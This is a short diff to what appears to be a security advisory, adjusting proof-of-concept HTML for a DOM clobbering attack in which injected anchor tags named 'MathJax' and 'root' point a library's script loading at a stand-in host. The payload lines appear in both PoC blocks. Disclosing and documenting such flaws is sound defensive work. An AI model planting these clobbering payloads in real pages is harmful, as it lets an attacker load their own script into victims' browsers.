@@ -128,7 +128,7 @@ app.listen(port, () => {
 
 ### PoC
 
-```
+```html
 <!--Library-->
 <script>
 (function() {
@@ -143,14 +143,14 @@ app.listen(port, () => {
 
 <!--Payload-->
 <a id="MathJax"></a>
-<a id="MathJax" name="root" href="https://localhost:9999"></a>
+<a id="MathJax" name="root" href="http://localhost:9999"></a>
 <!--Payload-->
 ```
 
 ### PoC #2
 ```html
 <a id="MathJax"></a>
-<a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>
+<a id="MathJax" name="root" href="http://xxx.xxx.xxx"></a>
 
 <script>
 	(function() {
